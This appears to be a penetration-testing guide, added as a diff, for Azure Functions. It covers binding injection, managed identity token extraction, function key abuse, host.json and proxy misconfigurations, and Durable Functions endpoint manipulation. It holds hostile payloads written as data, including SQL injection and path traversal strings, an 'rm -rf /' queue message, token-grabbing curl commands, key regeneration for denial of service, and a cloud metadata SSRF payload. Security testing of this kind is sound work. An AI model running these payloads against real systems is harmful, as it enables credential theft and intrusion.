@@ -1,0 +1,469 @@
+<azure_functions_security_guide>
+<title>AZURE FUNCTIONS SECURITY TESTING</title>
+
+<critical>Azure Functions is Microsoft's serverless compute platform. Security vulnerabilities arise from binding injection, managed identity abuse, function key exposure, host.json misconfigurations, and Durable Functions exploitation. Testing must cover all function types and trigger mechanisms.</critical>
+
+<scope>
+- Binding injection attacks
+- Managed identity abuse
+- Function key exposure
+- Host.json misconfigurations
+- Durable Functions exploitation
+- Authorization level bypass
+- Code and configuration exposure
+</scope>
+
+<methodology>
+1. Identify Azure Functions endpoints and trigger types.
+2. Test binding configurations for injection.
+3. Probe managed identity permissions.
+4. Check for function key exposure.
+5. Analyze host.json configurations.
+6. Test Durable Functions orchestrations.
+</methodology>
+
+<binding_injection>
+<input_binding_attacks>
+{% raw %}
+# Input binding injection:
+
+# 1. HTTP trigger injection:
+# Function receives HTTP request
+POST /api/function
+{"user": "admin", "isAdmin": true}
+
+# Query parameter injection:
+GET /api/function?id=1 OR 1=1
+
+# 2. Blob binding injection:
+# If blob name from input:
+{
+  "type": "blob",
+  "name": "container/{user_input}",  # Path traversal
+  "path": "container/{user_input}"
+}
+# Payload: ../other-container/secret.txt
+
+# 3. Queue message injection:
+# Queue trigger with untrusted content
+{
+  "command": "rm -rf /",
+  "target": "database"
+}
+
+# 4. Cosmos DB binding:
+# If query from input:
+{
+  "type": "cosmosDB",
+  "sqlQuery": "SELECT * FROM c WHERE c.id = {id}"  # Injection
+}
+# Payload: 1' OR '1'='1
+{% endraw %}
+</input_binding_attacks>
+
+<output_binding_attacks>
+{% raw %}
+# Output binding manipulation:
+
+# 1. Blob output path:
+# Control where output is written
+{
+  "type": "blob",
+  "path": "{input_path}"
+}
+# Write to sensitive location
+
+# 2. Queue output:
+# Inject malicious messages
+context.bindings.outputQueue = {
+  maliciousPayload: true
+};
+
+# 3. Table storage:
+# Control partition/row key
+{
+  "tableName": "users",
+  "partitionKey": "{user_input}",
+  "rowKey": "{user_row}"
+}
+# IDOR via key manipulation
+
+# 4. SignalR:
+# Send to unintended users
+{
+  "type": "signalR",
+  "hubName": "chat",
+  "userId": "{attacker_controlled}"
+}
+{% endraw %}
+</output_binding_attacks>
+</binding_injection>
+
+<managed_identity>
+<identity_abuse>
+{% raw %}
+# Managed identity exploitation:
+
+# 1. Get access token:
+# From within function:
+curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
+  "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01"
+
+# 2. Common targets:
+# - Key Vault
+# - Storage accounts
+# - SQL databases
+# - Azure Resource Manager
+# - Microsoft Graph
+
+# 3. Token exfiltration:
+# If code execution achieved:
+var token = await credential.GetTokenAsync(
+  new TokenRequestContext(new[] { "https://management.azure.com/.default" })
+);
+# Exfiltrate token
+
+# 4. Over-privileged identity:
+# Identity may have excessive permissions
+# List all resources, read secrets
+az resource list --output table
+az keyvault secret list --vault-name ...
+{% endraw %}
+</identity_abuse>
+
+<identity_enumeration>
+{% raw %}
+# Managed identity enumeration:
+
+# 1. Check identity endpoint:
+$env:IDENTITY_ENDPOINT
+$env:IDENTITY_HEADER
+
+# 2. Available resources:
+# Try tokens for different services
+resources=(
+  "https://management.azure.com"
+  "https://vault.azure.net"
+  "https://storage.azure.com"
+  "https://database.windows.net"
+  "https://graph.microsoft.com"
+)
+
+# 3. Permission testing:
+# For each resource, test operations
+# ARM: list subscriptions, resource groups
+# Key Vault: list/get secrets
+# Storage: list containers, read blobs
+
+# 4. Role enumeration:
+az role assignment list --assignee {identity_id}
+{% endraw %}
+</identity_enumeration>
+</managed_identity>
+
+<function_keys>
+<key_exposure>
+{% raw %}
+# Function key discovery:
+
+# 1. Key locations:
+# - Azure Portal
+# - local.settings.json
+# - Environment variables
+# - Source code
+# - Git repositories
+
+# 2. Key types:
+# Function key: per function access
+# Host key: all functions access
+# Master key: admin operations
+
+# 3. Common exposure:
+# GitHub search:
+"x-functions-key"
+"code=" site:github.com
+
+# Application settings:
+GET /admin/host/systemkeys
+GET /admin/host/keys
+
+# 4. Key in URLs:
+https://func.azurewebsites.net/api/function?code=xxxxx
+# May appear in:
+# - Logs
+# - Referrer headers
+# - Browser history
+{% endraw %}
+</key_exposure>
+
+<key_exploitation>
+{% raw %}
+# Function key exploitation:
+
+# 1. Direct invocation:
+curl -X POST \
+  "https://func.azurewebsites.net/api/Function1?code=xxx" \
+  -H "Content-Type: application/json" \
+  -d '{"malicious": true}'
+
+# 2. Master key access:
+# Access admin endpoints
+POST /admin/functions/{functionName}
+x-functions-key: {master_key}
+
+# 3. Key enumeration:
+GET /admin/host/keys?code={master_key}
+# Returns all keys
+
+# 4. Key regeneration:
+# DoS by regenerating keys
+POST /admin/host/keys/{keyName}?code={master_key}
+{"name": "default", "value": ""}
+
+# 5. System key access:
+GET /admin/host/systemkeys?code={master_key}
+{% endraw %}
+</key_exploitation>
+</function_keys>
+
+<host_configuration>
+<host_json_issues>
+{% raw %}
+# host.json misconfiguration:
+
+# 1. Default authorization:
+{
+  "http": {
+    "routePrefix": "api"
+  }
+}
+# Missing: authLevel default
+
+# 2. CORS misconfiguration:
+{
+  "extensions": {
+    "http": {
+      "cors": {
+        "allowedOrigins": ["*"]  # Too permissive
+      }
+    }
+  }
+}
+
+# 3. Logging exposure:
+{
+  "logging": {
+    "logLevel": {
+      "default": "Trace"  # Verbose logging
+    }
+  }
+}
+
+# 4. Extension bundle:
+{
+  "extensionBundle": {
+    "id": "Microsoft.Azure.Functions.ExtensionBundle",
+    "version": "[1.*, 2.0.0)"  # May include vulnerable versions
+  }
+}
+
+# 5. Custom handler:
+{
+  "customHandler": {
+    "description": {
+      "defaultExecutablePath": "handler.exe"
+    }
+  }
+}
+{% endraw %}
+</host_json_issues>
+
+<routing_issues>
+{% raw %}
+# Routing and proxy configuration:
+
+# 1. Proxy configuration:
+# proxies.json vulnerabilities
+{
+  "proxies": {
+    "internal": {
+      "matchCondition": {
+        "route": "/internal/{*path}"
+      },
+      "backendUri": "https://internal-api.local/{path}"
+    }
+  }
+}
+# SSRF via proxy
+
+# 2. Route prefix bypass:
+# Default: /api/
+# Test: /api/../admin/
+# Test: //api/function
+
+# 3. Function name enumeration:
+/api/function1
+/api/function2
+/api/admin
+/api/health
+
+# 4. Slot access:
+# Production vs staging
+func.azurewebsites.net
+func-staging.azurewebsites.net
+{% endraw %}
+</routing_issues>
+</host_configuration>
+
+<durable_functions>
+<orchestration_attacks>
+{% raw %}
+# Durable Functions exploitation:
+
+# 1. Instance enumeration:
+GET /runtime/webhooks/durabletask/instances?code={key}
+
+# 2. Instance manipulation:
+# Terminate instance:
+POST /runtime/webhooks/durabletask/instances/{id}/terminate?reason=attack
+
+# 3. Raise event:
+POST /runtime/webhooks/durabletask/instances/{id}/raiseEvent/{eventName}
+{"maliciousPayload": true}
+
+# 4. Query instances:
+GET /runtime/webhooks/durabletask/instances
+# May expose sensitive orchestration data
+
+# 5. Entity access:
+# Durable entities may contain state
+POST /runtime/webhooks/durabletask/entities/{entityName}/{entityKey}
+
+# 6. History access:
+GET /runtime/webhooks/durabletask/instances/{id}/history
+# May contain sensitive activity data
+{% endraw %}
+</orchestration_attacks>
+
+<durable_injection>
+{% raw %}
+# Durable function injection:
+
+# 1. Activity input injection:
+// If activity input from user:
+await context.CallActivityAsync("ProcessData", userInput);
+// userInput may contain malicious payload
+
+# 2. Sub-orchestration:
+// Call to sub-orchestration with user data
+await context.CallSubOrchestratorAsync("SubOrch", attackerData);
+
+# 3. External event injection:
+// Wait for event with attacker-controlled name
+await context.WaitForExternalEvent(eventName);
+
+# 4. Timer manipulation:
+// If timer duration from input:
+await context.CreateTimer(DateTime.UtcNow.AddDays(999));
+# DoS via long timer
+
+# 5. Continuation token:
+// Manipulate continuation in HTTP response
+{% endraw %}
+</durable_injection>
+</durable_functions>
+
+<authorization_bypass>
+<auth_level_bypass>
+{% raw %}
+# Authorization level bypass:
+
+# 1. Anonymous access:
+# Check for functions with AuthLevel.Anonymous
+GET /api/public-function
+# No authentication required
+
+# 2. Function level vs Admin:
+# AuthorizationLevel.Function
+# Try without key
+GET /api/protected-function
+
+# 3. Key in different locations:
+# Query string: ?code=xxx
+# Header: x-functions-key: xxx
+# Header: Authorization: Bearer xxx
+
+# 4. Admin endpoint access:
+POST /admin/host/status
+x-functions-key: {key}
+
+# 5. Mixed authentication:
+# Some functions may have different auth
+# Test each function independently
+{% endraw %}
+</auth_level_bypass>
+</authorization_bypass>
+
+<common_payloads>
+{% raw %}
+# Key in header:
+x-functions-key: {function_key}
+
+# Admin access:
+POST /admin/host/keys?code={master_key}
+
+# Binding injection:
+{"path": "../secret/data"}
+
+# Managed identity:
+curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net"
+
+# Durable instance:
+GET /runtime/webhooks/durabletask/instances
+
+# SSRF via proxy:
+{"url": "http://169.254.169.254/metadata"}
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate binding injection accessing unauthorized data.
+2. Show managed identity token extraction.
+3. Prove function key exposure or bypass.
+4. Document host.json misconfiguration.
+5. Provide Durable Functions manipulation evidence.
+</validation>
+
+<false_positives>
+- Proper authorization levels configured
+- Managed identity with minimal permissions
+- Function keys properly secured
+- Strict CORS configuration
+- Durable Functions with proper access control
+- Input validation on bindings
+</false_positives>
+
+<impact>
+- Unauthorized function invocation
+- Data access via binding injection
+- Cloud resource access via managed identity
+- Configuration and secret exposure
+- Workflow manipulation via Durable Functions
+- Denial of service via resource exhaustion
+</impact>
+
+<pro_tips>
+1. Test all function trigger types.
+2. Check for exposed function keys.
+3. Enumerate managed identity permissions.
+4. Review host.json for misconfigurations.
+5. Test Durable Functions status endpoints.
+6. Look for proxies.json for SSRF.
+7. Check authorization level on each function.
+8. Test both query and header for keys.
+9. Look for staging slots with weaker security.
+10. Document function app and subscription details.
+</pro_tips>
+
+<remember>Azure Functions security spans bindings, authentication, managed identity, and configuration. A single misconfigured authorization level or exposed function key can compromise the entire application. Test all function types and their specific attack surfaces.</remember>
+</azure_functions_security_guide>
